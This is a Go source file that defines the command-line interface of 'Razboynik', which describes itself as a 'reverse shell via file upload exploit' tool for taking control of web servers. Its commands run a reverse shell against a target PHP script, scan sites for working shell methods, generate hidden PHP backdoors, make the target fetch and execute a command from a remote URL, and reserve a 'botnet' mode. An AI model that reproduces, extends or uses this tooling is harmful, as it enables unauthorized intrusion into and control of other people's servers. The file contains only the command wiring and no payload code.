package app

import (
	"fmt"
	"time"

	"github.com/eatbytes/razboy/network"
	"github.com/eatbytes/razboynik/services"
	"github.com/urfave/cli"
)

type AppInterface struct {
	cmd    *cli.App
	server *network.NETWORK
}

func Create() *AppInterface {
	services.PrintIntro()
	app := &AppInterface{}
	app.createCli()

	return app
}

func (app *AppInterface) createCli() {
	var client *cli.App

	client = cli.NewApp()
	client.Commands = getCommands(app)
	client.Name = "Razboynik"
	client.Usage = "Reverse shell via file upload exploit"
	client.Version = "1.5.0"
	client.Compiled = time.Now()
	client.Authors = []cli.Author{
		cli.Author{
			Name:  "EatBytes",
			Email: "leakleass@protomail.com",
		},
	}
	client.Copyright = "(c) 2016 EatBytes. из России с любовью <3"
	client.EnableBashCompletion = true
	client.BashComplete = func(c *cli.Context) {
		fmt.Fprintf(c.App.Writer, "run\nscan\ngenerate\ninvisible\napi\nencode\ndecode\nhelp")
	}

	client.Flags = []cli.Flag{
		cli.BoolFlag{Name: "help, h", Usage: "Help"},
	}

	app.cmd = client
}

func (app *AppInterface) Exec(command []string) {
	app.cmd.Run(command)
}

func (app *AppInterface) Help(c *cli.Context) {
	cli.ShowAppHelp(c)
}

func getCommands(app *AppInterface) []cli.Command {
	var runDefinition = cli.Command{
		Name:    "run",
		Aliases: []string{"r"},
		Usage:   "Run reverse shell with configuration. Ex: run http://target.com/script.php",
		Action:  app.Run,
		Flags: []cli.Flag{
			cli.StringFlag{Name: "m, method", Usage: "Method to use. Ex: -m POST", Value: "GET"},
			cli.StringFlag{Name: "p, parameter", Usage: "Parameter to use. Ex: -p test", Value: "razboynik"},
			cli.IntFlag{Name: "s, shellmethod", Usage: "Shellmethod to use. Ex: -s 1", Value: 0},
			cli.StringFlag{Name: "k, key", Usage: "Key to unlock optional small protection. Ex: -k keytounlock", Value: "FromRussiaWithLove<3"},
			cli.BoolFlag{Name: "r, raw", Usage: "If set, send the request without base64 encoding"},
			cli.BoolFlag{Name: "c, crypt", Usage: "(Not available) Use a crypt"},
		},
	}

	var generateDefinition = cli.Command{
		Name:    "generate",
		Aliases: []string{"g"},
		Usage:   "(Not available) Generate php file",
		Action:  app.Generate,
		Flags: []cli.Flag{
			cli.StringFlag{Name: "m, method", Usage: "Method to use. Ex: -m POST", Value: "GET"},
			cli.StringFlag{Name: "p, parameter", Usage: "Parameter to use. Ex: -p test", Value: "razboynik"},
			cli.StringFlag{Name: "k, key", Usage: "Key to unlock optional small protection. Ex: -k keytounlock", Value: "FromRussiaWithLove<3"},
			cli.BoolFlag{Name: "r, raw", Usage: "If set, don't put the base64 decoder on the request"},
			cli.BoolFlag{Name: "i, invisible", Usage: "If set, generate an invisible php backdoor."},
		},
	}

	var scanDefinition = cli.Command{
		Name:    "scan",
		Aliases: []string{"s"},
		Usage:   "Scan a website to identify what shell method and method works on it. Ex: scan http://target.com/script.php",
		Action:  app.Scan,
		Flags: []cli.Flag{
			cli.StringFlag{Name: "p, parameter", Usage: "Parameter to use. Ex: -p test", Value: "razboynik"},
			cli.StringFlag{Name: "k, key", Usage: "Key to unlock small protection", Value: "FromRussiaWithLove<3"},
		},
	}

	var invisibleDefinition = cli.Command{
		Name:    "invisible",
		Aliases: []string{"i"},
		Usage:   "Execute a raw command available at an url (referer). Ex: invisible http://target.com/script.php http://website.com/cmd-i-want-to-execute.txt",
		Action:  app.Invisible,
	}

	var apiDefinition = cli.Command{
		Name:    "api",
		Aliases: []string{"a"},
		Usage:   "Start the API REST",
		Action:  app.Api,
	}

	var botnetDefinition = cli.Command{
		Name:    "botnet",
		Aliases: []string{"b"},
		Usage:   "(Not available)",
	}

	var encodeDefinition = cli.Command{
		Name:    "encode",
		Aliases: []string{"e"},
		Usage:   "Encode a string in base64. Ex: encode hello",
		Action:  app.Encode,
	}

	var decodeDefinition = cli.Command{
		Name:    "decode",
		Aliases: []string{"d"},
		Usage:   "Decode a base64 string. Ex: decode aGVsbG8=",
		Action:  app.Decode,
	}

	var helpDefinition = cli.Command{
		Name:    "help",
		Aliases: []string{"h"},
		Usage:   "Help of application",
		Action:  app.Help,
	}

	return []cli.Command{
		runDefinition,
		generateDefinition,
		scanDefinition,
		invisibleDefinition,
		apiDefinition,
		botnetDefinition,
		encodeDefinition,
		decodeDefinition,
		helpDefinition,
	}
}
